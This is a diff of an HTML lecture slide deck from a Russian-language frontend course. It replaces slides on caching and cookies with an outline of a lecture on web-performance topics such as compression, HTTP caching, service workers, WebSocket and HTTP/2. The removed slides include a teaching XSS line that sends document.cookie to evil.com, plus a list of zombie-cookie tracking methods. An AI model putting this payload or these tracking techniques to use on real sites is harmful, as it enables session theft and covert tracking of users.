@@ -43,19 +43,102 @@
 </header>
 
 <section class="slide first">
-	<h2 class="shout">Работа с данными в браузере<br/>
+	<h2 class="shout"><span style="display: inline-block; font-size: 88px; line-height: 80px;">Производительность web-приложений</span><br/>
 		<small>Слайды доступны по ссылке<br/>
 			<a href="https://frontend-park-mailru.firebaseapp.com/">frontend-park-mailru.firebaseapp.com</a>
 		</small>
 	</h2>
 </section>
 
-<section class="slide">
-	<h2 class="shout"><span style="font-size: 90%">Кэширование, cookies, хранение данных</span></h2>
+<section class="slide question">
+	<h2>
+		<span style="display: inline-block; font-size: 75%">Из чего складывается производительность WEB'а?</span>
+	</h2>
 </section>
 
-<section class="slide question">
-	<h2>Кэширование</h2>
+<section class="slide">
+	<h2>Производительность WEB'а</h2>
+	<p class="small-content"></p>
+	<ul>
+		<li>Производительность во время работы web-приложения &mdash; <em>о ней чуть позже: через пару лекций</em></li>
+		<li>Производительность во время загрузки web-приложения &mdash; <em>а вот про это как раз наша лекция</em></li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Производительность WEB'а</h2>
+	<p class="note">В чём суть лекции: в том, что мы сначала рассказываем про то, как можно оптимизировать фронтенд под обычный http (gzip, кэш, хаки, storage, sw), а потом рассказываем про "новые протоколы" &mdash; websocket и HTTP/2</p>
+	<ul>
+		<li>Что происходит во время загрузки страницы, какие стадии проходит http-запрос и httpS запрос</li>
+		<li>Что влияет на продолжительность выполнения запроса, какие есть характеристики и метрики, PerformanceTiming, <code>performance.getEntries()</code>, События load, DOMContentLoaded</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Производительность WEB'а</h2>
+	<ul style="font-size: 90%">
+		<li>Минификация и оптимизация статики, картинок, скриптов, стилей, шрифтов, html. Сжатие тела ответа (gzip), сравнение минификации/оптимизации/сжатия через gzip. Zopfli/Brotli - поддержка браузерами и сравнение производительности сжатия/разжатия. Сравнение на разных типах содержимого (Brotli для текста, Zopfli для бинарных данных). Фишка того, что в Brotli долго сжимается, зато хорошо и быстро распаковывается.</li>
+		<li>"Сжатие" данных за счёт новых форматов данных, WebP для картинок, WebM для мультимедиа, WOFF /WOFF2 для шрифтов, protobuf</li>
+		<li>Кэширование в HTTP, кэширование заголовков (например CORS), кэширование DNS, предзапросы (https://ymatuhin.ru/front-end/html5-link-prefetch/), "кэширование через js-предзапросы" (грузим картинку js-ом, чтобы потом она сразу отобразилась без мигания), хаки кэширования (уникальные имена для бандлов, чтобы закешировать его навсегда и рандомные гет-параметры, чтобы "отключить" кэширование)</li>
+		<li>Как не выстрелить себе в голову с кэшированием</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Как побороть недостатки HTTP?</h2>
+	<ul>
+		<li>Долгая установка соединения и хак с конкатенацией статики (стили, спрайты, скрипты) чтобы уменьшить количество запросов</li>
+		<li>Один запрос на соединение и connection: keep-alive/close</li>
+		<li>предкэширование https-конекшенов *</li>
+		<li>Max. 6 connections per domain и domain-шардинг</li>
+		<li>То, что с запросом отправляется 100500 мегабайт кук и всего такого и вынесение статики на отдельные домены, чтобы туда куки не отправлялись</li>
+		<li>Инлайн данных, base64 картинок/шрифтов, критикал css, критикал js и критикал html</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Про то, где хранить много данных (кэширование, которым мы управляем)</h2>
+	<ul>
+		<li>Разные типы хранилищ: localStorage/sessionStorage, WebSQL/IndexedDB, FileSystem</li>
+		<li>Работа с localStorage/sessionStorage: сходства/различия, общение между вкладками через событие storage, синхронный запрос, упомянуть про то, что setItem может кинуть эксепшен</li>
+		<li>Пример работы с WebSQL/IndexedDB (просто по паре строк кода), отличия от localStorage/sessionStorage (в том, что есть индексы, что запросы асинхронные), поддержка браузерами</li>
+		<li>Ссылки на примеры с FileSystem</li>
+		<li>Ограничения по памяти</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Ещё более умное кэширование (service-workers) [про обычные воркеры я уже упоминал на лекции, они чуть-чуть в курсе]</h2>
+	<ul>
+		<li>Поддержка, плюсы и минусы, зачем используется</li>
+		<li>Жизненный цикл, создание и установка воркера</li>
+		<li>Пример кода для оффлайн-работы с sw</li>
+		<li>Обязательно картинку https://mdn.mozillademos.org/files/12630/important-notes.png (из статьи https://developer.mozilla.org/ru/docs/Web/API/Service_Worker_API/Using_Service_Workers)</li>
+		<li>Как ещё можно использовать сервис-воркеры (пример из телеграма, где они в веб-версии перекодировали картинки из крутых форматов, чтобы показывать стикеры быстро)</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>перерыв</h2>
+	<p class="small-content">По примерным прикидам, это где-то 1:40 от лекции. Плюс 10 минут перерым и получается на вторую часть около 1:05 &mdash; в целом очень круто выходит</p>
+</section>
+
+<section class="slide">
+	<h2>Протокол WebSocket</h2>
+	<ul>
+		<li>Определение</li>
+		<li>Поддержка</li>
+		<li>Преймущества/недостатки</li>
+		<li>Как использовать?</li>
+	</ul>
+</section>
+
+<section class="slide">
+	<h2>Протокол HTTP/2</h2>
+	<ul>
+		<li>По слайдам</li>
+		<li>Рассказать, что в http/2 были исправлены многие недостатки http/1.1</li>
+	</ul>
 </section>
 
 <section class="slide">
@@ -175,175 +258,6 @@
 		<li><span>Гет-параметр:</span><br><code>GET /script.js?_=1492172324776</code></li>
 		<li><span>Уникальные имена:</span><br><code>GET /bundle.026f8e459c8f89ef75fa7a78265a0025.js</code></li>
 	</ul>
-</section>
-
-<section class="slide question">
-	<h2>Cookies</h2>
-</section>
-
-<section class="slide question">
-	<h2>HTTP is a stateless protocol</h2>
-</section>
-
-<section class="slide">
-	<h2>Cookies</h2>
-	<div>
-		<blockquote>
-			<p class="small-content"><b>Куки (cookies)</b> &mdash; небольшой фрагмент данных, отправленный веб-сервером
-				и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть
-				страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса</p>
-		</blockquote>
-	</div>
-</section>
-
-<section class="slide">
-	<h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a> cookies</h2>
-	<p class="small-content"></p>
-	<ul lang="ru">
-		<li>Браузер должен хранить как минимум 4096 байт кук</li>
-		<li>Минимум 20 шт. на домен</li>
-		<li>Минимум 300 шт. всего</li>
-		<li>Имена
-			<mark>нечувствительны</mark>
-			к регистру
-		</li>
-	</ul>
-</section>
-
-<section class="slide">
-	<h2>1 Клиент → Сервер</h2>
-	<pre class="hljs http">
-			<code>GET / HTTP/1.1</code>
-			<code>Host: example.com</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>2 Клиент ← Сервер</h2>
-	<pre class="hljs http">
-			<code>HTTP/1.1 200 OK</code>
-			<code><mark>Set-Cookie: name=value</mark></code>
-			<code>Content-Type: text/html</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>3 Клиент → Сервер</h2>
-	<pre class="hljs http">
-			<code>GET / HTTP/1.1</code>
-			<code>Host: example.com</code>
-			<code><mark>Cookie: name=value</mark></code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>4 Клиент ← Сервер</h2>
-	<pre class="hljs http">
-			<code>HTTP/1.1 200 OK</code>
-			<code><mark>Set-Cookie: name=value2</mark></code>
-			<code>Content-Type: text/html</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>Использование</h2>
-	<p class="small-content"></p>
-	<ul lang="ru">
-		<li>Аутентификация пользователей</li>
-		<li>Хранение настроек пользователей</li>
-		<li>Отслеживание сеанса (сессия)</li>
-		<li>Сбор статистики</li>
-		<li>Проведение экспериментов</li>
-		<li>etc...</li>
-	</ul>
-</section>
-
-<section class="slide">
-	<h2>Set-Cookie</h2>
-	<pre class="hljs http">
-			<code>Set-Cookie: value</code>
-			<code>                 [;<span hidden>X:</span> Expires=date]</code>
-			<code>                 [;<span hidden>X:</span> Max-Age=age]</code>
-			<code>                 [;<span hidden>X:</span> Domain=domain]</code>
-			<code>                 [;<span hidden>X:</span> Path=path]</code>
-			<code>                 [;<span hidden>X:</span> Secure]</code>
-			<code>                 [;<span hidden>X:</span> HttpOnly]</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>Cookie ID</h2>
-	<pre class="hljs http">
-			<code>Set-Cookie: name=v1; domain=.example.com; path=/</code>
-			<code>Set-Cookie: name=v2; domain=www.example.com; path=/</code>
-			<code>Set-Cookie: name=v3; domain=.example.com; path=/archive</code>
-			<code> </code>
-		</pre>
-	<pre class="hljs http">
-			<code>Cookie: name=v1; name=v2; name=v3</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>JavaScript</h2>
-	<p class="small-content"></p>
-	<pre class="hljs js">
-			<code>document.cookie; /* 'name1=value1' */</code>
-			<code class="next">document.cookie = 'name2=value2';</code>
-			<code class="next">document.cookie; /* 'name1=value1; name2=value2' */</code>
-			<code> </code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
-	<p class="small-content"></p>
-	<pre class="hljs js">
-			<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
-			<code>                    document.cookie;</code>
-		</pre>
-</section>
-
-<section class="slide">
-	<h2>Zombie Cookie</h2>
-	<div>
-		<p class="small-content"></p>
-		<img style="float:left" src="zombie.png">
-		<blockquote>
-			<p><b>What are Zombie Cookies?</b><br/>A zombie cookie is an HTTP cookie that returns to life automatically
-				after being deleted by the user</p>
-		</blockquote>
-	</div>
-</section>
-
-<section class="slide">
-	<h2>Zombie Cookie</h2>
-	<div>
-		<ul>
-			<li>Storing cookies in and reading out web history</li>
-			<li>Storing cookies in HTTP ETags</li>
-			<li>Internet Explorer userData storage (starting IE9, userData is no longer supported)</li>
-			<li>HTML5 Storage</li>
-			<li>Storing cookies in RGB values of auto-generated, force-cached PNGs using HTML5 Canvas tag to read pixels
-				(cookies) back out
-			</li>
-			<li>Local Shared Objects (Flash cookies)</li>
-			<li>Silverlight Isolated Storage</li>
-		</ul>
-	</div>
-</section>
-
-<section class="slide">
-	<h2>HSTS Cookie</h2>
-	<p class="small-content">
-		<a href="https://github.com/ben174/hsts-cookie">https://github.com/ben174/hsts-cookie</a>
-	</p>
 </section>
 
 <section class="slide question">
